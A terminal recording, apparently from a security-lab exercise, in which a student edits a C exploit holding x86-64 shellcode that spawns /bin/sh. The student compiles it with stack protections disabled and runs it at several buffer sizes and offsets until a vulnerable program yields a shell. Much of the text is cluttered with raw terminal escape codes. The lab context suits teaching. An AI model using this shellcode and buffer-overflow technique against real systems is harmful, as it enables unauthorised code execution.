@@ -1,0 +1,136 @@
+Script started on Mon 07 Mar 2016 06:45:44 PM EST
+]0;seclab@SecurityLabUbuntu64: ~/Downloadsseclab@SecurityLabUbuntu64:~/Downloads$ gcc[K[K[Kvi attack.c
+[?1049h[?1h=[2;1H▽[6n[1;1H  [1;1H[1;36r[?12;25h[?12l[?25h[27m[m[H[2J[?25l[36;1H"attack.c" 57L, 1332C[>c[1;1H[35m#include [m[31m<stdio.h>[m
+[35m#include [m[31m<string.h>[m
+[35m#include [m[31m<unistd.h>[m
+
+[32mchar[m shellcode[] = [31m"[m[35m\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90[m[31m"
+"[m[35m\x48\xbf\x2f\x62\x69\x6e\x2f\x73\x68\x11[m[31m"
+"[m[35m\x48\xc1\xe7\x08[m[31m"
+"[m[35m\x48\xc1\xef\x08[m[31m"
+"[m[35m\x57[m[31m"
+"[m[35m\x48\x89\xe7[m[31m"
+"[m[35m\x48\x31\xc0[m[31m"
+"[m[35m\x48\x31\xf6[m[31m"
+"[m[35m\x48\x31\xd2[m[31m"
+"[m[35m\xb0\x3b[m[31m"
+"[m[35m\x0f\x05[m[31m"
+"[m[35m\x00[m[31m"[m;
+
+[34m//Replace the above NOP buffer with your shell code.[m
+
+[32munsigned[m [32mlong[m get_sp([32mvoid[m) {[21;9H__asm__([31m"movq %rsp,%rax"[m);
+}
+
+[32mvoid[m main([32mint[m argc, [32mchar[m *argv[])
+{[26;9H[32mint[m bsize=[31m0[m, offset=[31m0[m,i=[31m0[m,j=[31m0[m;[27;9H[32mchar[m *buff, *ptr;[28;9H[32mlong[m [32mlong[m *addr,*addr_ptr;[29;9H[33mif[m (argc == [31m1[m)[30;9H{[31;17Hprintf([31m"[m[35m\n\n[m[31mUsage is either attack [buffer_size][m[35m\n[m[31m or attack [bufferr[32;1H_size] [stack_offset][m[35m\n[m[31m"[m);[33;17Hexit([31m0[m);[34;9H}[35;9H[33mif[m (argc > [31m1[m) bsize = atoi(argv[[31m1[m]);[36;67H1,1[11CTop[1;1H[?12l[?25hP+q436f\P+q6b75\P+q6b64\P+q6b72\P+q6b6c\P+q2332\P+q2334\P+q2569\P+q2a37\P+q6b31\[?25l[36;67H2[2;1H[?12l[?25h[?25l[36;67H3[3;1H[?12l[?25h[?25l[36;67H4,0-1[4;1H[?12l[?25h[?25l[36;67H5,1  [5;1H[?12l[?25h[?25l[36;67H6[6;1H[?12l[?25h[?25l[36;67H7[7;1H[?12l[?25h[?25l[36;67H8[8;1H[?12l[?25h[?25l[36;67H9[9;1H[?12l[?25h[?25l[36;67H10,1[10;1H[?12l[?25h[?25l[36;68H1[11;1H[?12l[?25h[?25l[36;68H2[12;1H[?12l[?25h[?25l[36;68H3[13;1H[?12l[?25h[?25l[36;68H4[14;1H[?12l[?25h[?25l[36;68H5[15;1H[?12l[?25h[?25l[36;68H6[16;1H[?12l[?25h[?25l[36;68H7,0-1[17;1H[?12l[?25h[?25l[36;68H8,1  [18;1H[?12l[?25h[?25l[36;68H9,0-1[19;1H[?12l[?25h[?25l[36;67H20,1  [20;1H[?12l[?25h[?25l[36;68H1,1-8[21;8H[?12l[?25h[?25l[20;28H[46m{
+
+}[m[36;68H2,1  [22;1H[?12l[?25h[?25l[20;28H{
+
+}[36;68H3,0-1[23;1H[?12l[?25h[?25l[36;68H4,1  [24;1H[?12l[?25h[?25l[36;68H5[25;1H[?12l[?25h[?25l[36;68H6,1-8[26;8H[?12l[?25h[?25l[36;68H7[27;8H[?12l[?25h[?25l[36;68H8[28;8H[?12l[?25h[?25l[36;68H9[29;8H[?12l[?25h[?25l[36;67H30[30;8H[?12l[?25h[?25l[36;68H1[31;8H[?12l[?25h[?25l[36;68H2[33;8H[?12l[?25h[?25l[36;68H3[34;8H[?12l[?25h[?25l[36;68H4[35;8H[?12l[?25h[?25l[1;35r[35;1H
+[1;36r[35;9H[33mif[m (argc > [31m2[m) offset = atoi(argv[[31m2[m]);[36;1H[K[36;67H35,1-8[9C4%[35;8H[?12l[?25h[?25l[36;68H4[34;8H[?12l[?25h[?25l[36;68H3[33;8H[?12l[?25h[?25l[36;68H2[32;8H[?12l[?25h[?25l[36;68H1[30;8H[?12l[?25h[?25l[36;68H0[29;8H[?12l[?25h[?25l[36;67H29[28;8H[?12l[?25h[?25l[36;68H8[27;8H[?12l[?25h[?25l[36;68H7[26;8H[?12l[?25h[?25l[36;68H6[25;8H[?12l[?25h[?25l[36;68H5,1  [24;1H[?12l[?25h[?25l[36;68H4[23;1H[?12l[?25h[?25l[36;68H3,0-1[22;1H[?12l[?25h[?25l[19;28H[46m{
+
+}[m[36;68H2,1  [21;1H[?12l[?25h[?25l[19;28H{
+
+}[36;68H1,1-8[20;8H[?12l[?25h[?25l[36;68H0,1  [19;1H[?12l[?25h[?25l[36;67H19,0-1[18;1H[?12l[?25h[?25l[36;68H8,1  [17;1H[?12l[?25h[?25l[36;68H7,0-1[16;1H[?12l[?25h[?25l[36;68H6,1  [15;1H[?12l[?25h[?25l[36;68H5[14;1H[?12l[?25h[?25l[36;68H4[13;1H[?12l[?25h[?25l[36;68H3[12;1H[?12l[?25h[?25l[36;68H2[11;1H[?12l[?25h[?25l[36;68H1[10;1H[?12l[?25h[?25l[36;68H0[9;1H[?12l[?25h[?25l[36;67H9,1 [8;1H[?12l[?25h[?25l[36;67H8[7;1H[?12l[?25h[?25l[36;67H7[6;1H[?12l[?25h[?25l[36;67H6[5;1H[?12l[?25h[?25l[36;67H5[4;1H[?12l[?25h[?25l[36;67H4,0-1[3;1H[?12l[?25h[?25l[36;1H[1m-- INSERT --[m[36;67H[K[36;67H4,1[12C4%[3;1H[?12l[?25h[?25l[4;35r[4;1H[L[1;36r[36;67H[K[36;67H5,1[12C4%[4;1H[?12l[?25h[?25l/[36;69H2[4;2H[?12l[?25h[?25l[34m//[m[36;69H3[4;3H[?12l[?25h[?25l[34mN[m[36;69H4[4;4H[?12l[?25h[?25l[34mO[m[36;69H5[4;5H[?12l[?25h[?25l[34mP[m[36;69H6[4;6H[?12l[?25h[?25l[34m [m[36;69H7[4;7H[?12l[?25h[?25l[34ms[m[36;69H8[4;8H[?12l[?25h[?25l[34ml[m[36;69H9[4;9H[?12l[?25h[?25l[34me[m[36;69H10[4;10H[?12l[?25h[?25l[34md[m[36;70H1[4;11H[?12l[?25h[?25l[34m [m[36;70H2[4;12H[?12l[?25h[?25l[34mt[m[36;70H3[4;13H[?12l[?25h[?25l[34mo[m[36;70H4[4;14H[?12l[?25h[?25l[34m [m[36;70H5[4;15H[?12l[?25h[?25l[34ma[m[36;70H6[4;16H[?12l[?25h[?25l[34mv[m[36;70H7[4;17H[?12l[?25h[?25l[34mo[m[36;70H8[4;18H[?12l[?25h[?25l[34mi[m[36;70H9[4;19H[?12l[?25h[?25l[4;18H[K[36;70H8[4;18H[?12l[?25h[?25l[4;17H[K[36;70H7[4;17H[?12l[?25h[?25l[4;16H[K[36;70H6[4;16H[?12l[?25h[?25l[4;15H[K[36;70H5[4;15H[?12l[?25h[?25l[34mg[m[36;70H6[4;16H[?12l[?25h[?25l[34mi[m[36;70H7[4;17H[?12l[?25h[?25l[34mv[m[36;70H8[4;18H[?12l[?25h[?25l[34me[m[36;70H9[4;19H[?12l[?25h[?25l[34m [m[36;69H20[4;20H[?12l[?25h[?25l[34ma[m[36;70H1[4;21H[?12l[?25h[?25l[34m [m[36;70H2[4;22H[?12l[?25h[?25l[34mm[m[36;70H3[4;23H[?12l[?25h[?25l[4;22H[K[36;70H2[4;22H[?12l[?25h[?25l[4;21H[K[36;70H1[4;21H[?12l[?25h[?25l[34m [m[36;70H2[4;22H[?12l[?25h[?25l[34mb[m[36;70H3[4;23H[?12l[?25h[?25l[34mi[m[36;70H4[4;24H[?12l[?25h[?25l[34mg[m[36;70H5[4;25H[?12l[?25h[?25l[34mg[m[36;70H6[4;26H[?12l[?25h[?25l[34me[m[36;70H7[4;27H[?12l[?25h[?25l[34mr[m[36;70H8[4;28H[?12l[?25h[?25l[34m [m[36;70H9[4;29H[?12l[?25h[?25l[34mm[m[36;69H30[4;30H[?12l[?25h[?25l[34ma[m[36;70H1[4;31H[?12l[?25h[?25l[34mr[m[36;70H2[4;32H[?12l[?25h[?25l[34mg[m[36;70H3[4;33H[?12l[?25h[?25l[34mi[m[36;70H4[4;34H[?12l[?25h[?25l[34mn[m[36;70H5[4;35H[?12l[?25h[?25l[34m [m[36;70H6[4;36H[?12l[?25h[?25l[34mo[m[36;70H7[4;37H[?12l[?25h[?25l[34mf[m[36;70H8[4;38H[?12l[?25h[?25l[34m [m[36;70H9[4;39H[?12l[?25h[?25l[34me[m[36;69H40[4;40H[?12l[?25h[?25l[34mr[m[36;70H1[4;41H[?12l[?25h[?25l[34mr[m[36;70H2[4;42H[?12l[?25h[?25l[34mo[m[36;70H3[4;43H[?12l[?25h[?25l[34mr[m[36;70H4[4;44H[?12l[?25h[36;1H[K[4;43H[?25l[36;67H5,43[11C4%[4;43H[?12l[?25h[?25l[36;67H[K[36;1H:[?12l[?25hw[?25l[?12l[?25hq[?25l[?12l[?25h[?25l"attack.c" 58L, 1376C written
+[?1l>[?12l[?25h[?1049l]0;seclab@SecurityLabUbuntu64: ~/Downloadsseclab@SecurityLabUbuntu64:~/Downloads$ gcc -z execstack f-no-stack-protector attack .c -o attack
+gcc: error: f-no-stack-protector: No such file or directory
+]0;seclab@SecurityLabUbuntu64: ~/Downloadsseclab@SecurityLabUbuntu64:~/Downloads$ gcc -z execstack f-no-stack-protector attack..c -o attack[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cno-stack-protector attack.c[1P[A]0;seclab@SecurityLabUbuntu64: ~/Downloadsseclab@SecurityLabUbuntu64:~/Downloads$ [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C
+
+gcc: error: fno-stack-protector: No such file or directory
+]0;seclab@SecurityLabUbuntu64: ~/Downloadsseclab@SecurityLabUbuntu64:~/Downloads$ gcc -z execstack fno-stack-protector attack.cc -o attack[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C-fno-stack-protector attack.[1@c[A]0;seclab@SecurityLabUbuntu64: ~/Downloadsseclab@SecurityLabUbuntu64:~/Downloads$ [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C
+
+attack.c: In function ‘main’:
+attack.c:33:3: warning: incompatible implicit declaration of built-in function ‘exit’ [enabled by default]
+   exit(0);
+   ^
+attack.c:38:2: warning: format ‘%x’ expects argument of type ‘unsigned int’, but argument 2 has type ‘long unsigned int’ [-Wformat=]
+  printf("Before malloc, SP is : 0x%x\n", get_sp()); 
+  ^
+attack.c:39:9: warning: incompatible implicit declaration of built-in function ‘malloc’ [enabled by default]
+  buff = malloc(bsize); 
+         ^
+attack.c:40:7: warning: assignment makes pointer from integer without a cast [enabled by default]
+  addr = get_sp() -offset;
+       ^
+attack.c:41:2: warning: format ‘%x’ expects argument of type ‘unsigned int’, but argument 2 has type ‘long unsigned int’ [-Wformat=]
+  printf("After malloc, SP is : 0x%x\n", get_sp());
+  ^
+attack.c:42:2: warning: format ‘%x’ expects argument of type ‘unsigned int’, but argument 2 has type ‘long long int *’ [-Wformat=]
+  printf("\nUsing address as guess for beginning of attack buffer: 0x%x\n", addr); 
+  ^
+attack.c:48:13: warning: assignment makes integer from pointer without a cast [enabled by default]
+  *(addr_ptr)=addr;
+             ^
+attack.c:53:18: warning: assignment makes integer from pointer without a cast [enabled by default]
+  buff[bsize - 1] = (char*)NULL; 
+                  ^
+]0;seclab@SecurityLabUbuntu64: ~/Downloadsseclab@SecurityLabUbuntu64:~/Downloads$ ./attack 1024 120000
+Before malloc, SP is : 0xffffdeb0
+After malloc, SP is : 0xffffdeb0
+
+Using address as guess for beginning of attack buffer: 0xfffe09f0
+Starting vulnerable program
+
+Length of Input String:1022
+
+
+Value of Test:ffffb3e8
+Value of filename[0]:ffffafe0
+
+You are going to need a buffer a little larger than:1032
+
+]0;seclab@SecurityLabUbuntu64: ~/Downloadsseclab@SecurityLabUbuntu64:~/Downloads$ ./attack 1024 120000[C[C[1P 120000[1P 1200006 1200000 120000
+Before malloc, SP is : 0xffffdeb0
+After malloc, SP is : 0xffffdeb0
+
+Using address as guess for beginning of attack buffer: 0xfffe09f0
+Starting vulnerable program
+
+Length of Input String:1059
+
+
+Value of Test:ffffb3c8
+Value of filename[0]:ffffafc0
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/Downloadsseclab@SecurityLabUbuntu64:~/Downloads$ ./attack 1060 120000[C[K[K[K16[C[1P 12016[1P 120164 120168 12016
+Before malloc, SP is : 0xffffdeb0
+After malloc, SP is : 0xffffdeb0
+
+Using address as guess for beginning of attack buffer: 0xffffafc0
+Starting vulnerable program
+
+Length of Input String:1046
+
+
+Value of Test:ffffb3c8
+Value of filename[0]:ffffafc0
+
+You are going to need a buffer a little larger than:1032
+
+Segmentation fault (core dumped)
+]0;seclab@SecurityLabUbuntu64: ~/Downloadsseclab@SecurityLabUbuntu64:~/Downloads$ ./attack 1048 12016[K[K32
+Before malloc, SP is : 0xffffdeb0
+After malloc, SP is : 0xffffdeb0
+
+Using address as guess for beginning of attack buffer: 0xffffafb0
+Starting vulnerable program
+
+Length of Input String:1046
+
+
+Value of Test:ffffb3c8
+Value of filename[0]:ffffafc0
+
+You are going to need a buffer a little larger than:1032
+
+$ whoami
+seclab
+$ date
+Mon Mar  7 18:48:44 EST 2016
+$ exit
+]0;seclab@SecurityLabUbuntu64: ~/Downloadsseclab@SecurityLabUbuntu64:~/Downloads$ exit
+Script done on Mon 07 Mar 2016 06:48:48 PM EST
